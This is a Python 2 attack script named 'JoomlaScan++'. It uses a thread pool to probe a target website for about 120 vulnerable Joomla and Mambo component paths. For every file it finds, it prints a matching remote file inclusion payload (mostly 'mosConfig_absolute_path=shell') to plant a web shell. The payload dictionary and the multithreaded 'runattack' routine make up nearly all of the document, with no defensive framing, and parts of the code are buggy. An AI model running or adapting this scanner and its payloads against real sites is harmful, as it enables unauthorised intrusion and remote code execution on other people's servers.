#!/usr/bin/env python
import httplib,time,socket


import threading, Queue

class NoResultsPending(Exception):
    """All work requests have been processed."""
    pass
class NoWorkersAvailable(Exception):
    """No worker threads available to process remaining requests."""
    pass

class WorkerThread(threading.Thread):
    """Background thread connected to the requests/results queues.

    A worker thread sits in the background and picks up work requests from
    one queue and puts the results in another until it is dismissed.
    """

    def __init__(self, requestsQueue, resultsQueue, **kwds):
        """Set up thread in damonic mode and start it immediatedly.

        requestsQueue and resultQueue are instances of Queue.Queue passed
        by the ThreadPool class when it creates a new worker thread.
        """
        threading.Thread.__init__(self, **kwds)
        self.setDaemon(1)
        self.workRequestQueue = requestsQueue
        self.resultQueue = resultsQueue
        self._dismissed = threading.Event()
        self.start()

    def run(self):
        """Repeatedly process the job queue until told to exit.
        """

        while not self._dismissed.isSet():
            # thread blocks here, if queue empty
            request = self.workRequestQueue.get()
            if self._dismissed.isSet():
                # return the work request we just picked up
                self.workRequestQueue.put(request)
                break # and exit
            # XXX catch exceptions here and stick them to request object
            self.resultQueue.put(
                (request, request.callable(*request.args, **request.kwds))
            )

    def dismiss(self):
        """Sets a flag to tell the thread to exit when done with current job.
        """

        self._dismissed.set()


class WorkRequest:
    """A request to execute a callable for putting in the request queue later.

    See the module function makeRequests() for the common case
    where you want to build several work requests for the same callable
    but different arguments for each call.
    """

    def __init__(self, callable, args=None, kwds=None, requestID=None,
      callback=None):
        """A work request consists of the a callable to be executed by a
        worker thread, a list of positional arguments, a dictionary
        of keyword arguments.

        A callback function can be specified, that is called when the results
        of the request are picked up from the result queue. It must accept
        two arguments, the request object and it's results in that order.
        If you want to pass additional information to the callback, just stick
        it on the request object.

        requestID, if given, must be hashable as it is used by the ThreadPool
        class to store the results of that work request in a dictionary.
        It defaults to the return value of id(self).
        """
        if requestID is None:
            self.requestID = id(self)
        else:
            self.requestID = requestID
        self.callback = callback
        self.callable = callable
        self.args = args or []
        self.kwds = kwds or {}


class ThreadPool:
    """A thread pool, distributing work requests and collecting results.

    See the module doctring for more information.
    """

    def __init__(self, num_workers, q_size=0):
        """Set up the thread pool and start num_workers worker threads.

        num_workers is the number of worker threads to start initialy.
        If q_size > 0 the size of the work request is limited and the
        thread pool blocks when queue is full and it tries to put more
        work requests in it.
        """

        self.requestsQueue = Queue.Queue(q_size)
        self.resultsQueue = Queue.Queue()
        self.workers = []
        self.workRequests = {}
        self.createWorkers(num_workers)

    def createWorkers(self, num_workers):
        """Add num_workers worker threads to the pool."""

        for i in range(num_workers):
            self.workers.append(WorkerThread(self.requestsQueue,
              self.resultsQueue))

    def dismissWorkers(self, num_workers):
        """Tell num_workers worker threads to to quit when they're done."""

        for i in range(min(num_workers, len(self.workers))):
            worker = self.workers.pop()
            worker.dismiss()

    def putRequest(self, request):
        """Put work request into work queue and save for later."""

        self.requestsQueue.put(request)
        self.workRequests[request.requestID] = request

    def poll(self, block=False):
        """Process any new results in the queue."""
        while 1:
            try:
                # still results pending?
                if not self.workRequests:
                    raise NoResultsPending
                # are there still workers to process remaining requests?
                elif block and not self.workers:
                    raise NoWorkersAvailable
                # get back next results
                request, result = self.resultsQueue.get(block=block)
                # and hand them to the callback, if any
                if request.callback:
                    request.callback(request, result)
                del self.workRequests[request.requestID]
            except Queue.Empty:
                break

    def wait(self):
        """Wait for results, blocking until all have arrived."""

        while 1:
            try:
                self.poll(True)
            except NoResultsPending:
                break

def makeRequests(callable, args_list, callback=None):
    """Convenience function for building several work requests for the same
    callable with different arguments for each call.

    args_list contains the parameters for each invocation of callable.
    Each item in 'argslist' should be either a 2-item tuple of the list of
    positional arguments and a dictionary of keyword arguments or a single,
    non-tuple argument.

    callback is called when the results arrive in the result queue.
    """

    requests = []
    for item in args_list.items():
        if item == isinstance(item, tuple):
            requests.append(
              WorkRequest(callable, item[0], item[1], callback=callback))
        else:
            requests.append(
              WorkRequest(callable, [item], None, callback=callback))
    return requests





paths = {"components/com_flyspray/startdown.php" : "startdown.php?file=shell",
        "administrator/components/com_admin/admin.admin.html.php" : "admin.admin.html.php?mosConfig_absolute_path=shell",
        "components/com_simpleboard/file_upload.php" : "file_upload.php?sbp=shell",
        "components/com_hashcash/server.php" : "server.php?mosConfig_absolute_path=shell",
        "components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php" : "config.inc.php?mosConfig_absolute_path=shell",
        "components/com_sitemap/sitemap.xml.php" : "sitemap.xml.php?mosConfig_absolute_path=shell ",
        "components/com_performs/performs.php" : "performs.php?mosConfig_absolute_path=shell",
        "components/com_forum/download.php" : "download.php?phpbb_root_path=shell",
        "components/com_pccookbook/pccookbook.php" : "pccookbook.php?mosConfig_absolute_path=shell",
        "components/com_extcalendar/extcalendar.php" : "extcalendar.php?mosConfig_absolute_path=shell",
        "components/minibb/index.php" : "index.php?absolute_path=shell",
        "components/com_smf/smf.php" : "smf.php?mosConfig_absolute_path=",
        "modules/mod_calendar.php" : "mod_calendar.php?absolute_path=shell ",
        "components/com_pollxt/conf.pollxt.php" : "conf.pollxt.php?mosConfig_absolute_path=shell ",
        "components/com_loudmounth/includes/abbc/abbc.class.php" : "abbc.class.php?mosConfig_absolute_path=shell",
        "components/com_videodb/core/videodb.class.xml.php" : "videodb.class.xml.php?mosConfig_absolute_path=shell",
        "components/com_pcchess/include.pcchess.php" : "include.pcchess.php?mosConfig_absolute_path=shell",
        "administrator/components/com_multibanners/extadminmenus.class.php" : "extadminmenus.class.php?mosConfig_absolute_path=shell",
        "administrator/components/com_a6mambohelpdesk/admin.a6mambohelpdesk.php" : "admin.a6mambohelpdesk.php?mosConfig_live_site=shell",
        "administrator/components/com_colophon/admin.colophon.php" : "admin.colophon.php?mosConfig_absolute_path=shell",
        "administrator/components/com_mgm/help.mgm.php" : "help.mgm.php?mosConfig_absolute_path=shell",
        "components/com_mambatstaff/mambatstaff.php" : "mambatstaff.php?mosConfig_absolute_path=shell",
        "components/com_securityimages/configinsert.php" : "configinsert.php?mosConfig_absolute_path=shell",
        "components/com_securityimages/lang.php" : "lang.php?mosConfig_absolute_path=shell",
        "components/com_artlinks/artlinks.dispnew.php" : "artlinks.dispnew.php?mosConfig_absolute_path=shell",
        "components/com_galleria/galleria.html.php" : "galleria.html.php?mosConfig_absolute_path=shell",
        "akocomments.php" : "akocomments.php?mosConfig_absolute_path=shell",
        "administrator/components/com_cropimage/admin.cropcanvas.php" : "admin.cropcanvas.php?cropimagedir=shell",
        "administrator/components/com_kochsuite/config.kochsuite.php" : "config.kochsuite.php?mosConfig_absolute_path=shell",
        "administrator/components/com_comprofiler/plugin.class.php" : "plugin.class.php?mosConfig_absolute_path=shell",
        "components/com_zoom/classes/fs_unix.php" : "fs_unix.php?mosConfig_absolute_path=shell",
        "components/com_zoom/includes/database.php" : "database.php?mosConfig_absolute_path=shell",
        "administrator/components/com_serverstat/install.serverstat.php" : "install.serverstat.php?mosConfig_absolute_path=shell",
        "components/com_fm/fm.install.php" : "fm.install.php?lm_absolute_path=shell",
        "administrator/components/com_mambelfish/mambelfish.class.php" : "mambelfish.class.php?mosConfig_absolute_path=shell",
        "components/com_lmo/lmo.php" : "lmo.php?mosConfig_absolute_path=shell",
        "administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php" : "toolbar.linkdirectory.html.php?mosConfig_absolute_ path=shell",
        "components/com_mtree/Savant2/Savant2_Plugin_textarea.php" : "Savant2_Plugin_textarea.php?mosConfig_absolute_path=shell",
        "administrator/components/com_jim/install.jim.php" : "install.jim.php?mosConfig_absolute_path=shell",
        "administrator/components/com_webring/admin.webring.docs.php" : "admin.webring.docs.php?component_dir=shell",
        "administrator/components/com_remository/admin.remository.php" : "admin.remository.php?mosConfig_absolute_path=shell",
        "administrator/components/com_babackup/classes/Tar.php" : "Tar.php?mosConfig_absolute_path=shell",
        "administrator/components/com_lurm_constructor/admin.lurm_constructor.php" : "admin.lurm_constructor.php?lm_absolute_path=shell",
        "components/com_mambowiki/MamboLogin.php" : "MamboLogin.php?IP=shell",
        "administrator/components/com_a6mambocredits/admin.a6mambocredits.php" : "admin.a6mambocredits.php?mosConfig_live_site=shell",
        "administrator/components/com_phpshop/toolbar.phpshop.html.php" : "toolbar.phpshop.html.php?mosConfig_absolute_path=shell",
        "components/com_cpg/cpg.php" : "cpg.php?mosConfig_absolute_path=shell",
        "components/com_moodle/moodle.php" : "moodle.php?mosConfig_absolute_path=shell ",
        "components/com_extended_registration/registration_detailed.inc.php" : "registration_detailed.inc.php?mosConfig_absolute_path=shell",
        "components/com_mospray/scripts/admin.php" : "admin.php?basedir=shell",
        "administrator/components/com_bayesiannaivefilter/lang.php" : "lang.php?mosConfig_absolute_path=shell",
        "administrator/components/com_uhp/uhp_config.php" : "uhp_config.php?mosConfig_absolute_path=shell",
        "administrator/components/com_peoplebook/param.peoplebook.php" : "param.peoplebook.php?mosConfig_absolute_path=shell",
        "administrator/components/com_mmp/help.mmp.php" : "help.mmp.php?mosConfig_absolute_path=shell",
        "components/com_reporter/processor/reporter.sql.php" : "reporter.sql.php?mosConfig_absolute_path=shell",
        "components/com_madeira/img.php" : "img.php?url=shell",
        "components/com_jd-wiki/lib/tpl/default/main.php" : "main.php?mosConfig_absolute_path=shell",
        "components/com_bsq_sitestats/external/rssfeed.php" : "rssfeed.php?baseDir=shell",
        "com_bsq_sitestats/external/rssfeed.php" : "rssfeed.php?baseDir=shell",
        "components/com_slideshow/admin.slideshow1.php" : "admin.slideshow1.php?mosConfig_live_site=shell",
        "administrator/components/com_panoramic/admin.panoramic.php" : "admin.panoramic.php?mosConfig_live_site=shell",
        "administrator/components/com_mosmedia/includes/credits.html.php" : "credits.html.php?mosConfig_absolute_path=shell",
        "administrator/components/com_mosmedia/includes/info.html.php" : "info.html.php?mosConfig_absolute_path=shell",
        "administrator/components/com_mosmedia/includes/media.divs.php" : "media.divs.php?mosConfig_absolute_path=shell",
        "administrator/components/com_mosmedia/includes/media.divs.js.php" : "media.divs.js.php?mosConfig_absolute_path=shell",
        "administrator/components/com_mosmedia/includes/purchase.html.php" : "purchase.html.php?mosConfig_absolute_path=shell",
        "administrator/components/com_mosmedia/includes/support.html.php" : "support.html.php?mosConfig_absolute_path=shell",
        "administrator/components/com_wmtportfolio/admin.wmtportfolio.php" : "admin.wmtportfolio.php?mosConfig_absolute_path=shell",
        "components/com_mp3_allopass/allopass.php" : "components/com_mp3_allopass/allopass.php?mosConfig_live_site=shell",
        "components/com_mp3_allopass/allopass-error.php" : "components/com_mp3_allopass/allopass-error.php?mosConfig_live_site=shell",
        "administrator/components/com_jcs/jcs.function.php" : "administrator/components/com_jcs/jcs.function.php?mosConfig_absolute_path=shell",
        "administrator/components/com_jcs/view/add.php" : "administrator/components/com_jcs/view/add.php?mosConfig_absolute_path=shell",
        "administrator/components/com_jcs/view/history.php" : "administrator/components/com_jcs/view/history.php?mosConfig_absolute_path=shell",
        "administrator/components/com_jcs/view/register.php" : "administrator/components/com_jcs/view/register.php?mosConfig_absolute_path=shell",
        "administrator/components/com_jcs/views/list.sub.html.php" : "administrator/components/com_jcs/views/list.sub.html.php?mosConfig_absolute_path=shell",
        "administrator/components/com_jcs/views/list.user.sub.html.php" : "administrator/components/com_jcs/views/list.user.sub.html.php?mosConfig_absolute_path=shell",
        "administrator/components/com_jcs/views/reports.html.php" : "administrator/components/com_jcs/views/reports.html.php?mosConfig_absolute_path=shell",
        "com_joomla_flash_uploader/install.joomla_flash_uploader.php" : "com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=shell",
        "com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php" : "com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=shell",
        "administrator/components/com_jjgallery/admin.jjgallery.php" : "administrator/components/com_jjgallery/admin.jjgallery.php?mosConfig_absolute_path=shell",
        "administrator/components/com_juser/xajax_functions.php" : "administrator/components/com_juser/xajax_functions.php?mosConfig_absolute_path=shell",
        "components/com_jreviews/scripts/xajax.inc.php" : "components/com_jreviews/scripts/xajax.inc.php?mosConfig_absolute_path=shell",
        "com_directory/modules/mod_pxt_latest.php" : "com_directory/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=shell",
        "administrator/components/com_joomla_flash_uploader/install.joomla_flash_uploader.php" : "administrator/components/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=shell",
        "administrator/components/com_chronocontact/excelwriter/PPS/File.php" : "administrator/components/com_chronocontact/excelwriter/PPS/File.php?mosConfig_absolute_path=shell",
        "administrator/components/com_chronocontact/excelwriter/Writer.php" : "administrator/components/com_chronocontact/excelwriter/Writer.php?mosConfig_absolute_path=shell",
        "administrator/components/com_chronocontact/excelwriter/PPS.php" : "administrator/components/com_chronocontact/excelwriter/PPS.php?mosConfig_absolute_path=shell",
        "administrator/components/com_chronocontact/excelwriter/Writer/BIFFwriter.php" : "administrator/components/com_chronocontact/excelwriter/Writer/BIFFwriter.php?mosConfig_absolute_path=shell",
        "administrator/components/com_chronocontact/excelwriter/Writer/Workbook.php" : "administrator/components/com_chronocontact/excelwriter/Writer/Workbook.php?mosConfig_absolute_path=shell",
        "administrator/components/com_chronocontact/excelwriter/Writer/Worksheet.php" : "administrator/components/com_chronocontact/excelwriter/Writer/Worksheet.php?mosConfig_absolute_path=shell",
        "administrator/components/com_chronocontact/excelwriter/Writer/Format.php" : "administrator/components/com_chronocontact/excelwriter/Writer/Format.php?mosConfig_absolute_path=shell",
        "index.php?option=com_custompages" : "index.php?option=com_custompages&cpage=shell",
        "component/com_onlineflashquiz/quiz/common/db_config.inc.php" : "component/com_onlineflashquiz/quiz/common/db_config.inc.php?base_dir=shell",
        "administrator/components/com_joomla-visites/core/include/myMailer.class.php" : "administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=shell",
        "index.php?option=com_facileforms" : "components/com_facileforms/facileforms.frame.php?ff_compath=shell",
        "administrator/components/com_rssreader/admin.rssreader.php" : "administrator/components/com_rssreader/admin.rssreader.php?mosConfig_live_site=shell",
        "administrator/components/com_feederator/includes/tmsp/add_tmsp.php" : "administrator/components/com_feederator/includes/tmsp/add_tmsp.php?mosConfig_absolute_path=shell",
        "administrator/components/com_feederator/includes/tmsp/edit_tmsp.php" : "administrator/components/com_feederator/includes/tmsp/edit_tmsp.php?mosConfig_absolute_path=shell",
        "administrator/components/com_feederator/includes/tmsp/subscription.php" : "administrator/components/com_feederator/includes/tmsp/subscription.php?GLOBALS[mosConfig_absolute_path]=shell",
        "administrator/components/com_feederator/includes/tmsp/tmsp.php" : "administrator/components/com_feederator/includes/tmsp/tmsp.php?mosConfig_absolute_path=shell",
        "administrator/components/com_clickheat/install.clickheat.php" : "administrator/components/com_clickheat/install.clickheat.php?GLOBALS[mosConfig_absolute_path]=shell",
        "administrator/components/com_clickheat/includes/heatmap/_main.php" : "administrator/components/com_clickheat/includes/heatmap/_main.php?mosConfig_absolute_path=shell",
        "administrator/components/com_clickheat/includes/heatmap/main.php" : "administrator/components/com_clickheat/includes/heatmap/main.php?mosConfig_absolute_path=shell",
        "administrator/components/com_clickheat/includes/overview/main.php" : "administrator/components/com_clickheat/includes/overview/main.php?mosConfig_absolute_path=shell",
        "administrator/components/com_clickheat/Recly/Clickheat/Cache.php" : "administrator/components/com_clickheat/Recly/Clickheat/Cache.php?GLOBALS[mosConfig_absolute_path]=shell",
        "administrator/components/com_clickheat/Recly/Clickheat/Clickheat_Heatmap.php" : "administrator/components/com_clickheat/Recly/Clickheat/Clickheat_Heatmap.php?GLOBALS[mosConfig_absolute_path]=shell",
        "administrator/components/com_clickheat/Recly/common/GlobalVariables.php" : "administrator/components/com_clickheat/Recly/common/GlobalVariables.php?GLOBALS[mosConfig_absolute_path]=shell",
        "administrator/components/com_competitions/includes/competitions/add.php" : "administrator/components/com_competitions/includes/competitions/add.php?GLOBALS[mosConfig_absolute_path]=shell",
        "administrator/components/com_competitions/includes/competitions/competitions.php" : "administrator/components/com_competitions/includes/competitions/competitions.php?GLOBALS[mosConfig_absolute_path]=shell",
        "administrator/components/com_competitions/includes/settings/settings.php" : "administrator/components/com_competitions/includes/settings/settings.php?mosConfig_absolute_path=shell",
        "administrator/components/com_dadamail/config.dadamail.php" : "administrator/components/com_dadamail/config.dadamail.php?GLOBALS['mosConfig_absolute_path']=shell",
        "administrator/components/com_googlebase/admin.googlebase.php" : "administrator/components/com_googlebase/admin.googlebase.php?mosConfig_absolute_path=shell",
        "administrator/components/com_ongumatimesheet20/lib/onguma.class.php" : "administrator/components/com_ongumatimesheet20/lib/onguma.class.php?mosConfig_absolute_path=shell",
        "administrator/components/com_treeg/admin.treeg.php" : "administrator/components/com_treeg/admin.treeg.php?mosConfig_live_site=shell"}

def usage():
    print """\tUsage: ./joomlascan.py <site> <options>
\t[options]
\t   -p/--proxy <host:port> : Add proxy support
\t   -e/--errors : Show Error responses
\t   -j : path to joomla if needed
Ex: ./joomlascan.py www.test.com -404 -p 127.0.0.1:8080

"""
    sys.exit(1)

def testproxy(proxy):
    try:
        httplib.HTTPConnection(proxy).connect()
    except:
        print "Proxy broke! Reverting to Direct Connect Ctrl-C Now if this scares you!"
        time.sleep(3)
        globals()['proxy']=''

def testhost(host):
    try:
        httplib.HTTPConnection(host).connect()
    except:
        print "Host down, or you're an idiot! Either way, I'm out of here!"
        sys.exit(1)
    
        

def runattack(apath,shell):
    proxy=globals()['proxy']
    host=globals()['host']
    path=globals()['joomlapath']
    p404=globals()['p404']
    #print "Apath:",apath,"- Shell:",shell
    if proxy:
        h=httplib.HTTP(proxy)
        h.putrequest("GET", "http://"+host+"/"+path+"/"+apath)
    else:
        h=httplib.HTTP(host)
        h.putrequest("HEAD", "/"+path+"/"+apath)
    h.putheader("Host", host)
    h.endheaders()
    try:
        status, reason, headers = h.getreply()
        if status==200:
            print 'Found: '+apath+': Use Shell: '+shell
        elif p404:
            print 'Not Found:',apath,status,reason
    except(), msg: 
        print "Error Occurred:",msg
        pass
      
if __name__=="__main__":
    import getopt,sys
    print "\n\tJoomlaScan++ - Now Not As Ghey!"
    print "\t--------------------------------------------"

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hep:j:", ["help", "output="])
    except getopt.GetoptError, err:
        usage()
    socket.setdefaulttimeout(6)
    p404=False
    proxy=''
    host=''
    joomlapath=''
    for o, a in opts:
        if o == "-v":
            verbose = True
        elif o in ("-h", "--help"):
            usage()
        elif o in ("-p", "--proxy"):
            proxy=a
        elif o in ("-e","--errors"):
            p404=True
        elif o in ("-j","--joomlapath"):
            joomlapath=a
        else:
            usage()
    if args:
        host=args[0]
    else:
        usage()
    if proxy:
        testproxy(proxy)
    testhost(host)
    attackpool=ThreadPool(20)
    for item in paths.items():
        attackpool.putRequest(WorkRequest(runattack,item))
    print "Main thread working..."
    while 1:
        try:
            attackpool.poll()
            time.sleep(0.5)
        except (KeyboardInterrupt):
            print "User Break... Exiting..."
            break
        except (NoResultsPending):
            print "Scan Finished: Exiting."
            break
    
    
